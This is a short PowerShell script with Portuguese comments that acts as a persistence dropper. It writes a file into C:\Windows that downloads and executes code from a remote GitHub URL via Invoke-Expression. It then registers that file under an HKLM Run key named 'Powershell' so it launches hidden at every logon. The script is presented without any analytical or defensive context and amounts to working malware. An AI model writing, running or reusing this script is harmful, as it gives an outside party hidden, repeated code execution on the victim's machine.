# Define o conteúdo do script
$scriptContent = @"
    Invoke-Expression -Command (Invoke-RestMethod -Uri "https://raw.githubusercontent.com/so251/olaquerida/main/script.txt")
"@

# Define o caminho completo para salvar o arquivo
$filePath = "C:\Windows\powershell1.ps1"

# Salva o conteúdo no arquivo especificado
Set-Content -Path $filePath -Value $scriptContent -Force

# Caminho do script PowerShell
$programPath = "C:\Windows\powershell1.ps1"

# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
